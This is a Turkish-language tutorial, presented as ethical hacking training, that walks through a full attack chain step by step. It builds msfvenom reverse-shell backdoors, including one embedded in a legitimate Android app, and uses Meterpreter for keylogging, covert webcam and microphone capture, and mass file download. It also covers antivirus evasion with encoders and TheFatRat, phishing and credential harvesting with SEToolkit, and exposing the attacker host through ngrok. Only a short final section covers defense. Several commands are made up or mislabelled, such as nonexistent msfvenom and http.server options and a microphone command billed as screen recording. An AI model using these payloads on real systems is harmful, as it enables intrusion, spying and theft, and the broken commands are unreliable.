
# 🛡️ Backdoor ve Gelişmiş Sızma Testleri

> **Amaç:** Backdoor kavramını, oluşturma yöntemlerini ve savunma stratejilerini detaylı olarak öğrenmek.  
> **Not:** Bu eğitim yalnızca *izinli ortamlarda* ve *test amaçlı* yapılmalıdır.

---

## 1️⃣ Backdoor Nedir? 🚪

### 📌 **Tanım ve Kapsam:**
Backdoor, bir sisteme veya cihaza yetkisiz erişim sağlayan gizli bir giriş noktasıdır. Normal güvenlik kontrollerini atlayarak saldırganın sisteme sızmasına olanak tanır.

### 🏠 **Günlük Hayattan Benzetme:**
Bir eve gizlice ikinci bir kapı eklemek gibi düşünün. Ev sahibi sadece ana kapıyı bildiği için, arka kapıdan giren hırsızı fark etmez. Aynı şekilde, backdoor da sistem yöneticisinin bilmediği gizli bir erişim yolu açar.

### 🎯 **Backdoor Türleri:**
- **Hardware Backdoor:** Fiziksel cihazlara yerleştirilen donanım seviyesinde açık
- **Software Backdoor:** Yazılım koduna gizlenen programatik açık
- **Network Backdoor:** Ağ trafiğinde gizlenen iletişim kanalı
- **Firmware Backdoor:** Cihazın temel yazılımına yerleştirilen kalıcı açık

### ⚠️ **Yasal ve Etik Uyarı:**
Backdoor kullanımı yalnızca:
- Kendi sistemlerinizde test amaçlı
- Açık izin verilen sistemlerde
- Eğitim ve araştırma amaçlı olmalıdır

**İzinsiz kullanım suçtur ve ciddi yasal sonuçları vardır!**

---

## 2️⃣ Msfvenom ile Payload Oluşturma 🛠️

### 💡 **Msfvenom Nedir?**
Metasploit Framework'ün en güçlü araçlarından biri olan msfvenom, çeşitli platformlar için zararlı kod (payload) üretir. Bir "silah fabrikası" gibi düşünebilirsiniz.

### 🔍 **Payload Türleri ve Seçimi:**
```bash
# Tüm payload'ları listele
msfvenom -l payloads

# Windows için payload'ları filtrele
msfvenom -l payloads | grep windows

# Linux için payload'ları filtrele
msfvenom -l payloads | grep linux
```

### 🪟 **Windows Payload Oluşturma:**
```bash
# Basit reverse shell
msfvenom -p windows/shell/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe > backdoor.exe

# Meterpreter ile gelişmiş kontrol
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe > meterpreter_backdoor.exe

# PowerShell script olarak
msfvenom -p windows/shell/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f psh > backdoor.ps1
```

### 🐧 **Linux Payload Oluşturma:**
```bash
# x86 mimarisi için
msfvenom -p linux/x86/shell/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf > backdoor_x86.elf

# x64 mimarisi için
msfvenom -p linux/x64/shell/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf > backdoor_x64.elf

# Python script olarak
msfvenom -p linux/x86/shell/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f py > backdoor.py
```

### 📱 **Android Payload Oluşturma:**
```bash
# Android uygulaması olarak
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f apk > backdoor.apk

# Android uygulamasını mevcut APK'ya gömme
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -x legitimate_app.apk -f apk > infected_app.apk
```

---

## 3️⃣ Backdoor ile Bağlantı Sağlama 🔌

### 📡 **Dinleyici (Listener) Kurulumu:**
Backdoor'u çalıştırmadan önce, saldırgan bilgisayarında bir dinleyici başlatılmalıdır. Bu, telefon görüşmesinde karşı tarafın telefonunu açmasını beklemek gibidir.

```bash
# Metasploit konsolunu başlat
msfconsole

# Handler modülünü kullan
use exploit/multi/handler

# Payload'ı ayarla (oluşturduğunuz payload ile aynı olmalı)
set payload windows/meterpreter/reverse_tcp

# Saldırgan bilgisayarının IP adresini ayarla
set LHOST 192.168.1.10

# Port numarasını ayarla
set LPORT 4444

# Dinleyiciyi başlat
exploit
```

### 🎮 **Meterpreter Komutları - Temel Seviye:**
```bash
# Sistem bilgilerini al
sysinfo

# Mevcut kullanıcıyı öğren
getuid

# Çalışan işlemleri listele
ps

# Ağ bağlantılarını görüntüle
netstat

# Dosya sistemini keşfet
ls
pwd
cd
```

### 🎮 **Meterpreter Komutları - Gelişmiş Seviye:**
```bash
# Ekran görüntüsü al
screenshot

# Webcam'den fotoğraf çek
webcam_snap

# Mikrofon kaydı al
record_mic -d 30

# Dosya indir
download dosya.txt

# Dosya yükle
upload dosya.txt

# Klavye tuşlarını kaydet
keyscan_start
keyscan_dump
keyscan_stop
```

---

## 4️⃣ Web Sunucusu ile Dosya Gönderme 🌐

### 📡 **Python ile Hızlı Web Sunucusu:**
Hedef cihaza backdoor dosyasını göndermek için basit bir web sunucusu kurulabilir. Bu, bir "dosya paylaşım merkezi" gibi çalışır.

```bash
# Python 3 ile web sunucusu başlat
python3 -m http.server 8080

# Belirli bir dizinde sunucu başlat
cd /path/to/files
python3 -m http.server 8080

# Farklı port kullan
python3 -m http.server 9000
```

### 🔗 **Erişim ve Kullanım:**
```
# Tarayıcıdan erişim
http://192.168.1.10:8080

# Wget ile dosya indirme (hedef cihazda)
wget http://192.168.1.10:8080/backdoor.exe

# Curl ile dosya indirme
curl -O http://192.168.1.10:8080/backdoor.exe
```

### 🛡️ **Güvenlik Önlemleri:**
```bash
# Sadece belirli IP'lerden erişime izin ver
python3 -m http.server 8080 --bind 192.168.1.10

# SSL sertifikası ile güvenli bağlantı
python3 -m http.server 8080 --bind 192.168.1.10 --certfile cert.pem
```

---

## 5️⃣ Ekran Görüntüsü Ele Geçirme 📸

### 💻 **Meterpreter ile Ekran Görüntüsü:**
```bash
# Anlık ekran görüntüsü al
screenshot

# Belirli bir kalitede ekran görüntüsü
screenshot -q 100

# Ekran görüntüsünü belirli bir konuma kaydet
screenshot /tmp/ekran.png
```

### 🎬 **Ekran Kaydı Alma:**
```bash
# Ekran kaydı başlat
record_mic -d 60

# Belirli süre ekran kaydı
record_mic -d 120

# Kaydı belirli konuma kaydet
record_mic -d 60 -f /tmp/kayit.wav
```

### 📱 **Webcam Kontrolü:**
```bash
# Webcam'den fotoğraf çek
webcam_snap

# Webcam listesini görüntüle
webcam_list

# Belirli webcam'den fotoğraf çek
webcam_snap -i 1
```

---

## 6️⃣ Antivirüse Yakalanmama Teknikleri 🥷

### 🔐 **Encoder Kullanma:**
Encoder'lar, payload'ı şifreleyerek antivirüs programlarının tanımasını zorlaştırır. Bu, bir mektubu şifreleyerek postacının içeriğini anlayamaması gibidir.

```bash
# Shikata Ga Nai encoder ile 5 kez şifreleme
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe > evaded.exe

# Farklı encoder'lar deneyin
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e x86/call4_dword_xor -i 3 -f exe > evaded2.exe

# Çoklu encoder kullanımı
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e x86/shikata_ga_nai,x86/call4_dword_xor -i 3 -f exe > multi_evaded.exe
```

### 🎭 **Kod Gizleme Teknikleri:**
```bash
# Sahte kod ekleme (junk code)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe --add-code "sahte_fonksiyon()" > junked.exe

# Dosya boyutunu artırma
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe --add-data "sahte_veri.txt" > padded.exe
```

### 🧪 **Antivirüs Test Etme:**
```bash
# VirusTotal API ile test (dikkatli kullanın!)
# https://www.virustotal.com/gui/

# Yerel antivirüs ile test
# Windows Defender, ClamAV gibi
```

---

## 7️⃣ Fatrat Kurulumu ve Kullanımı 🐀

### 📥 **Kurulum Süreci:**
Fatrat, backdoor oluşturma ve antivirüs atlatma konusunda uzmanlaşmış bir araçtır. Bir "siber güvenlik laboratuvarı" gibi düşünebilirsiniz.

```bash
# Repository'yi klonla
git clone https://github.com/Screetsec/TheFatRat.git

# Dizine geç
cd TheFatRat

# Kurulum scriptini çalıştırılabilir yap
chmod +x setup.sh

# Kurulumu başlat
./setup.sh
```

### 🚀 **Çalıştırma ve Kullanım:**
```bash
# Fatrat'ı başlat
./fatrat

# Menü seçenekleri:
# 1) Create Backdoor
# 2) Create Fud Backdoor
# 3) Create Backdoor with MSFvenom
# 4) Create Backdoor with Custom Payload
# 5) Create Backdoor with Custom Icon
```

### 🎯 **Özellikler:**
- **FUD (Fully Undetectable)** backdoor oluşturma
- Özel ikon ve dosya adı desteği
- Çoklu platform desteği
- Antivirüs atlatma teknikleri
- Otomatik kurulum scriptleri

---

## 8️⃣ Sosyal Mühendislik Giriş 🎭

### 💡 **Sosyal Mühendislik Nedir?**
İnsanların doğal eğilimlerini ve güvenlik açıklarını kullanarak bilgi veya sistem erişimi elde etme sanatıdır. Teknik açıklardan daha tehlikeli olabilir çünkü insan faktörü her zaman en zayıf halkadır.

### 🎭 **Günlük Hayattan Örnekler:**
- **Kargo Görevlisi:** Gerçek bir kargo görevlisi gibi davranarak binaya giriş
- **Teknik Destek:** Microsoft'tan arıyormuş gibi yaparak bilgisayar erişimi
- **Arkadaş Taklidi:** Sosyal medyada tanıdık biri gibi davranarak bilgi toplama
- **Acil Durum:** Acil bir durum olduğunu söyleyerek hızlı karar vermeye zorlama

### 🛠️ **SEToolkit (Social Engineering Toolkit):**
```bash
# Kurulum
sudo apt install set

# Çalıştırma
setoolkit

# Ana menü seçenekleri:
# 1) Social-Engineering Attacks
# 2) Penetration Testing (Fast-Track)
# 3) Third Party Modules
# 4) Update the Social-Engineer Toolkit
# 5) Update SET configuration
# 6) Help, Credits, and About
```

### 🎯 **Saldırı Vektörleri:**
```bash
# 1) Social-Engineering Attacks
#   1) Spear-Phishing Attack Vectors
#   2) Website Attack Vectors
#   3) Infectious Media Generator
#   4) Create a Payload and Listener
#   5) Mass Mailer Attack
#   6) Arduino-Based Attack Vector
#   7) SMS Spoofing Attack Vector
#   8) Wireless Access Point Attack Vector
#   9) QRCode Generator Attack Vector
#   10) Powershell Attack Vectors
#   11) Third Party Modules
```

---

## 9️⃣ Sadece Link ile Cihazlara Ulaşmak 🔗

### 🎣 **Phishing Sayfası Oluşturma:**
Phishing, balık tutmak gibidir. Balıkçı oltayı atar ve balığın gelmesini bekler. Hedef kişi linke tıkladığında, oltaya takılmış olur.

```bash
# SEToolkit ile phishing başlat
setoolkit

# 1) Social-Engineering Attacks
# 2) Website Attack Vectors
# 3) Credential Harvester Attack Method
# 4) Site Cloner
```

### 🌐 **Site Klonlama:**
```bash
# Hedef siteyi klonla
# Örnek: Facebook, Gmail, Twitter gibi

# Klonlanan site: http://192.168.1.10:80
# Orijinal site: https://www.facebook.com
```

### 📧 **E-posta ile Phishing:**
```bash
# Mass Mailer kullanarak toplu e-posta gönderimi
# 1) Social-Engineering Attacks
# 5) Mass Mailer Attack
# 1) Single Email Attack
# 2) Mass Email Attack
```

### 🎭 **Gelişmiş Phishing Teknikleri:**
- **Spear Phishing:** Belirli kişiye özel saldırı
- **Whaling:** Yüksek profilli hedeflere yönelik saldırı
- **Vishing:** Sesli arama ile yapılan saldırı
- **Smishing:** SMS ile yapılan saldırı

---

## 🔟 Ngrok ile Dışarıdan Erişim 🌍

### 💡 **Ngrok Nedir?**
Ngrok, yerel bilgisayarınızı internete açan bir tünel servisidir. Evinizin arka bahçesinden ana caddeye gizli bir geçit açmak gibidir.

### 📥 **Kurulum ve Yapılandırma:**
```bash
# Ngrok'u indir
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip

# Arşivi aç
unzip ngrok-stable-linux-amd64.zip

# Çalıştırılabilir yap
chmod +x ngrok

# Token ile kimlik doğrulama
./ngrok authtoken YOUR_AUTH_TOKEN

# HTTP tüneli aç (port 8080)
./ngrok http 8080

# HTTPS tüneli aç
./ngrok http 8080 --scheme https
```

### 🔧 **Gelişmiş Ngrok Özellikleri:**
```bash
# Belirli bir subdomain kullan
./ngrok http 8080 --subdomain=mybackdoor

# Şifre koruması ekle
./ngrok http 8080 --auth="username:password"

# IP kısıtlaması
./ngrok http 8080 --allow-header="X-Forwarded-For"

# Özel domain kullan
./ngrok http 8080 --hostname=custom.domain.com
```

### 📊 **Ngrok Dashboard:**
```
http://localhost:4040
```
Bu adresten tüm tünel aktivitelerini, istekleri ve logları görebilirsiniz.

---

## 1️⃣1️⃣ Kamera, Konum ve Mikrofon Ele Geçirme 📹🎤📍

### 📸 **Webcam Kontrolü:**
```bash
# Webcam listesini görüntüle
webcam_list

# Belirli webcam'den fotoğraf çek
webcam_snap -i 1

# Webcam stream'i başlat
webcam_stream

# Webcam stream'i durdur
webcam_stream -k
```

### 🎤 **Mikrofon Kontrolü:**
```bash
# Mikrofon kaydı başlat
record_mic -d 30

# Belirli süre kayıt
record_mic -d 60

# Kaydı belirli konuma kaydet
record_mic -d 30 -f /tmp/ses_kaydi.wav

# Mikrofon listesini görüntüle
record_mic -l
```

### 📍 **Konum Bilgisi:**
```bash
# Geolocation (IP tabanlı)
geolocate

# GPS koordinatları (cihazda GPS varsa)
# Bu özellik tüm cihazlarda mevcut değildir
```

### 🎯 **Pratik Kullanım Senaryoları:**
```bash
# Gizli gözetleme için
webcam_snap -i 0
screenshot
record_mic -d 10

# Veri toplama için
download /home/user/documents/
download /home/user/pictures/
download /home/user/downloads/
```

---

## 1️⃣2️⃣ Etik Siber Güvenlik ve Savunma 🛡️

### 🎯 **Kendimizi Korumak İçin:**
Backdoor saldırılarına karşı savunma, evinizi hırsızlara karşı korumak gibidir. Birden fazla güvenlik katmanı oluşturmalısınız.

#### 🔒 **Yazılım Güvenliği:**
- **Antivirüs:** Güncel ve güvenilir antivirüs yazılımı kullanın
- **Güncellemeler:** İşletim sistemi ve uygulamaları güncel tutun
- **Güvenlik Duvarı:** Windows Defender Firewall'u etkinleştirin
- **UAC:** Kullanıcı Hesap Denetimi'ni yüksek seviyede tutun

#### 🌐 **İnternet Güvenliği:**
- **Güvenilmeyen Linkler:** Şüpheli linklere tıklamayın
- **E-posta Güvenliği:** Bilinmeyen göndericilerden gelen e-postaları açmayın
- **İndirilen Dosyalar:** Güvenilmeyen kaynaklardan dosya indirmeyin
- **HTTPS:** Sadece güvenli bağlantıları kullanın

#### 🔑 **Şifre ve Kimlik Doğrulama:**
- **Güçlü Şifreler:** En az 12 karakter, büyük/küçük harf, sayı ve sembol
- **İki Faktörlü Doğrulama:** Mümkün olduğunda etkinleştirin
- **Şifre Yöneticisi:** Güvenli şifre yöneticisi kullanın
- **Farklı Şifreler:** Her hesap için farklı şifre kullanın

### 🧪 **Savunma Testleri:**
```bash
# Kendi sisteminizde güvenlik testleri yapın
# Nmap ile port taraması
nmap -sS localhost

# Antivirüs test dosyaları
# EICAR test dosyası kullanın

# Güvenlik açığı taraması
# OpenVAS veya Nessus kullanın
```

### 📚 **Sürekli Öğrenme:**
- **Güvenlik Blog'ları:** Güncel tehditleri takip edin
- **CTF (Capture The Flag):** Pratik yapın
- **Güvenlik Konferansları:** Katılım sağlayın
- **Sertifikalar:** CEH, OSCP gibi sertifikalar alın

---

## 📊 Görsel Akış Diyagramı 🔄

```
[Sosyal Mühendislik] 
         ↓
      [Phishing Link] 
         ↓
   [Backdoor Yükleme] 
         ↓
   [Ngrok ile Erişim] 
         ↓
[Kamera/Mikrofon Kontrolü]
         ↓
    [Veri Toplama]
```

---

## 🎯 **Önemli Hatırlatmalar:**

1. **Yasal Kullanım:** Bu teknikleri sadece kendi sistemlerinizde veya açık izin verilen sistemlerde kullanın
2. **Etik Sorumluluk:** Öğrendiklerinizi savunma amaçlı kullanın
3. **Sürekli Güncelleme:** Siber güvenlik alanında sürekli öğrenmeye devam edin
4. **Topluluk:** Siber güvenlik topluluğuna katkıda bulunun

---

## 🔗 **Faydalı Kaynaklar:**

- **Metasploit Framework:** https://www.metasploit.com/
- **SEToolkit:** https://github.com/trustedsec/social-engineer-toolkit
- **TheFatRat:** https://github.com/Screetsec/TheFatRat
- **Ngrok:** https://ngrok.com/
- **OWASP:** https://owasp.org/
- **HackTricks:** https://book.hacktricks.xyz/

---

*Bu eğitim materyali, etik siber güvenlik eğitimi amaçlı hazırlanmıştır. Tüm teknikler yalnızca savunma ve eğitim amaçlı kullanılmalıdır.*
